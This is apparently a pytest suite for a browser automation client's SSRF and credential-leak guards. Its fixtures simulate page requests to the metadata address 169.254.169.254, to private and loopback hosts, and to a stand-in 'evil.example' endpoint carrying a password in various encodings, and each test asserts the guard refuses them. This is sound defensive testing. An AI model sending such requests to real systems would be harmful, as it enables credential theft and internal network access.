"""SSRF at RUNTIME: the seam judges the URL a caller names, and nothing else.

Every sub-resource the page itself fetches — an iframe, an XHR, a 302 hop the
JavaScript follows — leaves the engine without ever passing the guard, so a
page that names `169.254.169.254` reaches the IMDS with the operator's
credentials. The cure is the CDP `Fetch` domain: the engine pauses each
request and the client answers continue-or-fail.

These tests drive the REAL `CdpPipeClient` over real pipes and act as the
engine on the other end. The `CdpDouble` cannot prove this path: it has no
event pump, so it can neither pause a request nor observe the reply.
"""

import json
import os
import select
from typing import Any

import pytest

from nbrowser.errors import BrowserError, ClosedFailure
from nbrowser.session import BrowserLaunchConfig, BrowserSession, CdpPipeClient

FRAME_TIMEOUT = 5.0


def _paused(request_id: str, url: str) -> dict[str, Any]:
    return {
        "method": "Fetch.requestPaused",
        "sessionId": "s1",
        "params": {
            "requestId": request_id,
            "request": {"url": url, "method": "GET"},
        },
    }


class _Engine:
    """The other end of the CDP pipe: what the engine writes, and what it reads."""

    def __init__(self) -> None:
        engine_out, self.to_client = os.pipe()
        self.from_client, client_out = os.pipe()
        self.client = CdpPipeClient(fd_in=engine_out, fd_out=client_out)
        self.buf = bytearray()

    def emit(self, frame: dict[str, Any]) -> None:
        os.write(self.to_client, json.dumps(frame).encode("utf-8") + b"\0")

    def frame(self) -> dict[str, Any]:
        while b"\0" not in self.buf:
            ready, _, _ = select.select([self.from_client], [], [], FRAME_TIMEOUT)
            assert ready, (
                f"no frame in {FRAME_TIMEOUT}s: the request was never judged"
                f" (partial buffer {bytes(self.buf)!r})"
            )
            self.buf.extend(os.read(self.from_client, 4096))
        cut = self.buf.index(b"\0")
        frame = json.loads(bytes(self.buf[:cut]).decode("utf-8"))
        del self.buf[: cut + 1]
        return dict(frame)

    def close(self) -> None:
        self.client.close()
        os.close(self.to_client)
        os.close(self.from_client)


def test_opening_a_tab_arms_the_interceptor_on_its_session() -> None:
    """A tab is born blank, attached, ARMED, and only then navigated —
    `Target.createTarget` carrying the URL starts loading before anything is
    attached, and those sub-resources meet no guard at all."""
    engine = _Engine()
    try:
        session = BrowserSession(
            BrowserLaunchConfig(headless=True), client_factory=lambda: engine.client
        )
        engine.emit({"id": 1, "result": {"targetId": "t9"}})
        engine.emit({"id": 2, "result": {"sessionId": "s9"}})
        engine.emit({"id": 3, "result": {}})
        engine.emit({"id": 4, "result": {}})
        engine.emit({"id": 5, "result": {}})
        engine.emit({"id": 6, "result": {}})
        engine.emit({"id": 7, "result": {"identifier": "1"}})
        engine.emit({"id": 8, "result": {"frameId": "f9", "loaderId": "l9"}})
        engine.emit({"method": "Page.loadEventFired", "sessionId": "s9", "params": {}})
        engine.emit(
            {
                "method": "Page.lifecycleEvent",
                "sessionId": "s9",
                "params": {"name": "load", "frameId": "f9", "loaderId": "l9"},
            }
        )

        assert session.tabs_open("https://example.com/") == "t9"

        # Both interception, containment script, and correlated load events are armed before navigation.
        sent = [engine.frame() for _ in range(8)]
        assert [f["method"] for f in sent] == [
            "Target.createTarget",
            "Target.attachToTarget",
            "Fetch.enable",
            "Runtime.enable",
            "Page.enable",
            "Page.setLifecycleEventsEnabled",
            "Page.addScriptToEvaluateOnNewDocument",
            "Page.navigate",
        ]
        assert sent[0]["params"] == {"url": "about:blank"}
        assert sent[2]["sessionId"] == "s9"
        assert sent[2]["params"] == {"patterns": [{"urlPattern": "*"}]}
        assert sent[3]["sessionId"] == "s9"
        assert sent[3]["params"] == {}
        assert sent[5]["sessionId"] == "s9"
        assert sent[5]["params"] == {"enabled": True}
        assert sent[6]["sessionId"] == "s9"
        assert "RTCPeerConnection" in sent[6]["params"]["source"]
        assert "Worker" in sent[6]["params"]["source"]
        assert "_origImportScripts" in sent[6]["params"]["source"]
        assert sent[7]["params"] == {"url": "https://example.com/"}
    finally:
        engine.close()


def test_filtered_event_timeout_preserves_the_unrelated_load() -> None:
    engine = _Engine()
    previous = {"name": "load", "frameId": "f9", "loaderId": "previous"}
    try:
        engine.emit(
            {"method": "Page.lifecycleEvent", "sessionId": "s9", "params": previous}
        )
        engine.emit(
            {
                "method": "Page.frameStoppedLoading",
                "sessionId": "s9",
                "params": {"frameId": "f9"},
            }
        )
        # This later frame proves the reader has already queued the old load.
        assert engine.client.wait_event("Page.frameStoppedLoading", "s9") == {
            "frameId": "f9"
        }
        with pytest.raises(
            BrowserError, match="CDP event timeout: Page.lifecycleEvent"
        ) as error:
            engine.client.wait_event(
                "Page.lifecycleEvent",
                "s9",
                timeout=0,
                params={"name": "load", "frameId": "f9", "loaderId": "current"},
            )
        assert error.value.code == ClosedFailure.PROTOCOL
        assert (
            engine.client.wait_event("Page.lifecycleEvent", "s9", timeout=0) == previous
        )
    finally:
        engine.close()


def test_every_paused_request_is_judged_and_its_ack_is_not_kept() -> None:
    engine = _Engine()
    try:
        engine.emit(_paused("r1", "http://169.254.169.254/latest/meta-data/"))
        refused = engine.frame()
        assert refused["method"] == "Fetch.failRequest"
        assert refused["params"] == {
            "requestId": "r1",
            "errorReason": "BlockedByClient",
        }
        assert refused["sessionId"] == "s1"

        # The 302 the page follows re-pauses at request stage under the URL it
        # redirected TO, so a private destination is judged like any other.
        engine.emit(_paused("r2", "http://10.0.0.5/admin"))
        assert engine.frame()["method"] == "Fetch.failRequest"

        engine.emit(_paused("r3", "https://example.com/app.js"))
        allowed = engine.frame()
        assert allowed["method"] == "Fetch.continueRequest"
        assert allowed["params"] == {"requestId": "r3"}

        # The engine acks every reply. An ack nobody awaits is discarded, or a
        # busy page grows one dict entry per sub-resource for the tab's life.
        engine.emit({"id": 1, "result": {}})
        engine.emit(_paused("r4", "https://example.com/next.js"))
        assert engine.frame()["params"] == {"requestId": "r4"}
        assert engine.client.responses == {}
    finally:
        engine.close()


def test_frame_origin_tracking_blocks_redirect_to_public_then_loopback_and_isolates_subframes() -> (
    None
):
    engine = _Engine()
    try:
        # Simulate Target.attachToTarget and Page.navigate starting on loopback,
        # where a redirect to a public origin happens BEFORE Page.navigate replies.
        engine.client._main_frames["s1"] = "t1"
        engine.client._pending_nav_origin["s1"] = "http://127.0.0.1:8000/start"

        # 1. Main frame Document redirected to public origin before Page.navigate returns:
        engine.emit(
            {
                "method": "Fetch.requestPaused",
                "sessionId": "s1",
                "params": {
                    "requestId": "doc1",
                    "frameId": "f-main",
                    "resourceType": "Document",
                    "request": {"url": "https://example.com/landing", "method": "GET"},
                },
            }
        )
        assert engine.frame()["method"] == "Fetch.continueRequest"

        # Late Page.navigate reply arrives and must NOT overwrite the observed public origin:
        engine.client._record_navigation_reply(
            "s1", "f-main", "http://127.0.0.1:8000/start"
        )
        assert engine.client._frame_origins["f-main"] == "https://example.com/landing"

        # Subsequent request from f-main to loopback without Origin/Referer is refused:
        engine.emit(
            {
                "method": "Fetch.requestPaused",
                "sessionId": "s1",
                "params": {
                    "requestId": "sub1",
                    "frameId": "f-main",
                    "resourceType": "XHR",
                    "request": {"url": "http://127.0.0.1:8000/secret", "method": "GET"},
                },
            }
        )
        assert engine.frame()["method"] == "Fetch.failRequest"

        # 2. Main frame on loopback with a public subframe in the same session:
        engine.client._main_frames["s2"] = "f-loop"
        engine.client._frame_origins["f-loop"] = "http://127.0.0.1:8000/app"
        engine.emit(
            {
                "method": "Fetch.requestPaused",
                "sessionId": "s2",
                "params": {
                    "requestId": "iframe-doc",
                    "frameId": "f-sub",
                    "resourceType": "Document",
                    "request": {
                        "url": "https://public.example/widget",
                        "method": "GET",
                    },
                },
            }
        )
        assert engine.frame()["method"] == "Fetch.continueRequest"

        # Subframe attempting to reach loopback is refused:
        engine.emit(
            {
                "method": "Fetch.requestPaused",
                "sessionId": "s2",
                "params": {
                    "requestId": "iframe-xhr",
                    "frameId": "f-sub",
                    "resourceType": "XHR",
                    "request": {"url": "http://127.0.0.1:8000/api", "method": "GET"},
                },
            }
        )
        assert engine.frame()["method"] == "Fetch.failRequest"

        # Main frame on loopback can still reach loopback:
        engine.emit(
            {
                "method": "Fetch.requestPaused",
                "sessionId": "s2",
                "params": {
                    "requestId": "main-xhr",
                    "frameId": "f-loop",
                    "resourceType": "XHR",
                    "request": {"url": "http://127.0.0.1:8000/api", "method": "GET"},
                },
            }
        )
        assert engine.frame()["method"] == "Fetch.continueRequest"
    finally:
        engine.close()


def test_javascript_dialog_is_dismissed_immediately_on_reader_thread() -> None:
    engine = _Engine()
    try:
        engine.emit(
            {
                "method": "Page.javascriptDialogOpening",
                "sessionId": "s1",
                "params": {"type": "alert", "message": "blocking alert"},
            }
        )
        reply = engine.frame()
        assert reply["method"] == "Page.handleJavaScriptDialog"
        assert reply["params"] == {"accept": False}
        assert reply["sessionId"] == "s1"
        engine.emit({"id": reply["id"], "result": {}})
        assert len(engine.client.dialogs_closed) == 1
        assert engine.client.responses == {}
    finally:
        engine.close()


def test_containment_js_locks_prototype_constructors_constants_closure_and_ipv6() -> (
    None
):
    from nbrowser.session import CONTAINMENT_JS

    # 1. Prototype constructors must be rebound to the wrapped constructor
    assert "WrappedWS.prototype.constructor = WrappedWS" in CONTAINMENT_JS
    assert "WrappedES.prototype.constructor = WrappedES" in CONTAINMENT_JS
    assert "Wrapped.prototype.constructor = Wrapped" in CONTAINMENT_JS
    # 2. Static constants (OPEN, CONNECTING, etc.) must be preserved
    assert "Object.assign(WrappedWS, _OrigWS)" in CONTAINMENT_JS
    assert "Object.assign(WrappedES, _OrigES)" in CONTAINMENT_JS
    # 3. Worker bootstrap must be an IIFE closure and must not read writable global __nbrowserEffectiveOrigin
    assert "__nbrowserEffectiveOrigin" not in CONTAINMENT_JS
    assert "(function(_boundOrigin, _boundBase)" in CONTAINMENT_JS
    # 4. IPv6 ULA (fc00::/7), link-local (fe80::/10), and IPv4-mapped IPv6 (::ffff:)
    assert "f[cd][0-9a-f]{0,2}:" in CONTAINMENT_JS
    assert "fe[89ab][0-9a-f]:" in CONTAINMENT_JS
    assert "::ffff:" in CONTAINMENT_JS


def test_armed_secret_never_leaves_for_another_origin() -> None:
    import base64

    engine = _Engine()
    secret = "p@ss w0rd&x"

    def paused(rid: str, url: str, **request: Any) -> dict[str, Any]:
        return {
            "method": "Fetch.requestPaused",
            "sessionId": "s1",
            "params": {
                "requestId": rid,
                "resourceType": "Document",
                "request": {"url": url, "method": "POST", **request},
            },
        }

    try:
        engine.client.arm_secret("s1", "https://login.example", secret)
        # Same origin carries the password: the login itself.
        engine.emit(
            paused(
                "same", "https://login.example/session", postData="pw=p%40ss+w0rd%26x"
            )
        )
        assert engine.frame()["method"] == "Fetch.continueRequest"
        # Another origin with the form-encoded password in the body.
        engine.emit(
            paused("form", "https://evil.example/c", postData="pw=p%40ss+w0rd%26x")
        )
        assert engine.frame()["method"] == "Fetch.failRequest"
        # Another origin with the raw password in a base64 body entry.
        entry = base64.b64encode(f"pw={secret}".encode()).decode()
        engine.emit(
            paused(
                "entry", "https://evil.example/c", postDataEntries=[{"bytes": entry}]
            )
        )
        assert engine.frame()["method"] == "Fetch.failRequest"
        # Another origin with the password in the query string (a GET form).
        engine.emit(paused("get", "https://evil.example/c?pw=p%40ss%20w0rd%26x"))
        assert engine.frame()["method"] == "Fetch.failRequest"
        # A body the engine did not include is not proof of absence.
        engine.emit(paused("unseen", "https://evil.example/c", hasPostData=True))
        assert engine.frame()["method"] == "Fetch.failRequest"
        # Another origin without the password is not affected.
        engine.emit(paused("clean", "https://cdn.example/app.js"))
        assert engine.frame()["method"] == "Fetch.continueRequest"
        # Other sessions are not armed.
        other = paused("other", "https://evil.example/c", postData=f"pw={secret}")
        other["sessionId"] = "s2"
        engine.emit(other)
        assert engine.frame()["method"] == "Fetch.continueRequest"
    finally:
        engine.close()


@pytest.mark.parametrize(
    ("secret", "body", "charsets"),
    [
        ("safe/secret!", "pw=safe%2fsecret%21", ()),  # escapes a client chose
        ("safe/secret!", "pw=safe%252Fsecret%2521", ()),  # encoded twice
        ("p\u00e4ssword", "pw=p%E4ssword", ()),  # a windows-1252 page
        ("\u20acuro", "pw=%26%238364%3Buro", ()),  # latin-1: char reference
        ("\u79d8\u5bc6", "pw=%94%E9%96%A7", ("Shift_JIS",)),  # the page charset
        ("\u79d8\u5bc6", "pw=%C8%EB%CC%A9", ("EUC-JP",)),
        ("\u79d8\u5bc6", "pw=%C3%D8%C3%DC", ("GBK",)),
    ],
)
def test_armed_secret_is_matched_in_every_browser_form_encoding(
    secret: str, body: str, charsets: tuple[str, ...]
) -> None:
    engine = _Engine()
    try:
        engine.client.arm_secret("s1", "https://login.example", secret, charsets)
        engine.emit(
            {
                "method": "Fetch.requestPaused",
                "sessionId": "s1",
                "params": {
                    "requestId": "r",
                    "request": {
                        "url": "https://evil.example/c",
                        "method": "POST",
                        "postData": body,
                    },
                },
            }
        )
        assert engine.frame()["method"] == "Fetch.failRequest"
    finally:
        engine.close()


def test_a_form_charset_without_a_codec_refuses_to_arm() -> None:
    engine = _Engine()
    try:
        with pytest.raises(BrowserError):
            engine.client.arm_secret(
                "s1", "https://a.example", "pw", ("x-user-defined",)
            )
        assert engine.client._armed_secrets == {}
    finally:
        engine.close()


def test_submit_lock_refuses_cross_origin_navigation_until_the_login_lands() -> None:
    engine = _Engine()

    def paused(rid: str, url: str, rtype: str, body: str = "") -> dict[str, Any]:
        request: dict[str, Any] = {"url": url, "method": "POST" if body else "GET"}
        if body:
            request["postData"] = body
        return {
            "method": "Fetch.requestPaused",
            "sessionId": "s1",
            "params": {"requestId": rid, "resourceType": rtype, "request": request},
        }

    try:
        engine.client.arm_secret("s1", "https://login.example", "～pw", ("EUC-JP",))
        # A form submission to another origin, in bytes no codec table predicts.
        engine.emit(paused("a", "https://evil.example/c", "Document", "pw=%A1%C1pw"))
        assert engine.frame()["method"] == "Fetch.failRequest"
        # Sub-resources are not navigations: the page keeps loading.
        engine.emit(paused("b", "https://cdn.example/app.js", "Script"))
        assert engine.frame()["method"] == "Fetch.continueRequest"
        # The login lands on its own origin: the lock releases.
        engine.emit(paused("c", "https://login.example/s", "Document", "pw=x"))
        assert engine.frame()["method"] == "Fetch.continueRequest"
        engine.emit(paused("d", "https://app.example/home", "Document"))
        assert engine.frame()["method"] == "Fetch.continueRequest"
        # The byte guard still holds after the lock.
        engine.emit(paused("e", "https://evil.example/c", "XHR", "pw=～pw"))
        assert engine.frame()["method"] == "Fetch.failRequest"

        # An agent navigation releases the lock: the agent names that URL.
        engine.client.arm_secret("s1", "https://login.example", "pw2")
        engine.client.release_submit_lock("s1")
        engine.emit(paused("f", "https://other.example/", "Document"))
        assert engine.frame()["method"] == "Fetch.continueRequest"
    finally:
        engine.close()


def test_only_the_main_frame_landing_releases_the_submit_lock() -> None:
    engine = _Engine()

    def paused(rid: str, url: str, frame: str, body: str = "") -> dict[str, Any]:
        request: dict[str, Any] = {"url": url, "method": "POST" if body else "GET"}
        if body:
            request["postData"] = body
            request["hasPostData"] = True
        return {
            "method": "Fetch.requestPaused",
            "sessionId": "s1",
            "params": {
                "requestId": rid,
                "frameId": frame,
                "resourceType": "Document",
                "request": request,
            },
        }

    try:
        engine.client._main_frames["s1"] = "main"
        engine.client.arm_secret("s1", "https://login.example", "～pw", ("EUC-JP",))
        # An iframe of the login origin is not the login landing.
        iframe = paused("a", "https://login.example/widget", "sub")
        iframe["params"]["parentFrameId"] = "main"
        engine.emit(iframe)
        assert engine.frame()["method"] == "Fetch.continueRequest"
        engine.emit(paused("b", "https://evil.example/c", "main", "pw=%A1%C1pw"))
        assert engine.frame()["method"] == "Fetch.failRequest"
        # A script POST from the main frame to the login origin is not a landing.
        xhr = paused("x", "https://login.example/telemetry", "main", "ok=1")
        xhr["params"]["resourceType"] = "XHR"
        engine.emit(xhr)
        assert engine.frame()["method"] == "Fetch.continueRequest"
        engine.emit(paused("y", "https://evil.example/c", "main", "pw=%A1%C1pw"))
        assert engine.frame()["method"] == "Fetch.failRequest"
        # The main frame landing on the login origin releases it.
        engine.emit(paused("c", "https://login.example/s", "main", "pw=x"))
        assert engine.frame()["method"] == "Fetch.continueRequest"
        engine.emit(paused("d", "https://app.example/", "main"))
        assert engine.frame()["method"] == "Fetch.continueRequest"
    finally:
        engine.close()


def test_a_landing_redirected_with_its_body_to_another_origin_is_refused() -> None:
    engine = _Engine()

    def paused(rid: str, url: str, method: str) -> dict[str, Any]:
        request: dict[str, Any] = {"url": url, "method": method}
        if method == "POST":
            request["postData"] = "pw=%A1%C1pw"
            request["hasPostData"] = True
        return {
            "method": "Fetch.requestPaused",
            "sessionId": "s1",
            "params": {
                "requestId": rid,
                "frameId": "main",
                "resourceType": "Document",
                "request": request,
            },
        }

    try:
        engine.client._main_frames["s1"] = "main"
        engine.client.arm_secret("s1", "https://login.example", "～pw", ("EUC-JP",))
        engine.emit(paused("interception-job-7.0", "https://login.example/s", "POST"))
        assert engine.frame()["method"] == "Fetch.continueRequest"
        # Chromium names each redirect hop of one request `<base>.<hop>`.
        # A 307/308 hop keeps the method and the body: refused off the origin.
        engine.emit(paused("interception-job-7.1", "https://evil.example/c", "POST"))
        assert engine.frame()["method"] == "Fetch.failRequest"
        # A 302/303 hop becomes a GET without the body: the usual app redirect.
        engine.emit(paused("interception-job-7.2", "https://app.example/home", "GET"))
        assert engine.frame()["method"] == "Fetch.continueRequest"
    finally:
        engine.close()


def test_the_containment_script_is_installed_once_per_session() -> None:
    from nbrowser.session import CONTAINMENT_JS

    engine = _Engine()
    try:
        for i in range(1, 7):
            engine.emit({"id": i, "result": {"identifier": "1"} if i in (3, 6) else {}})
        engine.client.send("Page.enable", {}, "s9")
        engine.client.send("Page.enable", {}, "s9")
        methods = [engine.frame()["method"] for _ in range(5)]
        assert methods.count("Page.addScriptToEvaluateOnNewDocument") == 1
        ready, _, _ = select.select([engine.from_client], [], [], 0.3)
        assert not ready and b"\0" not in engine.buf
    finally:
        engine.close()
    # A second run in the same global returns at once instead of wrapping twice.
    assert "Symbol.for('nbrowser.contained')" in CONTAINMENT_JS


def test_a_failed_containment_install_is_retried_on_the_next_page_enable() -> None:
    engine = _Engine()
    try:
        engine.emit({"id": 1, "result": {}})
        engine.emit({"id": 2, "result": {}})
        engine.emit({"id": 3, "error": {"code": -32000, "message": "refused"}})
        with pytest.raises(BrowserError):
            engine.client.send("Page.enable", {}, "s9")
        engine.emit({"id": 4, "result": {}})
        engine.emit({"id": 5, "result": {}})
        engine.emit({"id": 6, "result": {"identifier": "1"}})
        engine.client.send("Page.enable", {}, "s9")
        methods = [engine.frame()["method"] for _ in range(6)]
        assert methods.count("Page.addScriptToEvaluateOnNewDocument") == 2
    finally:
        engine.close()
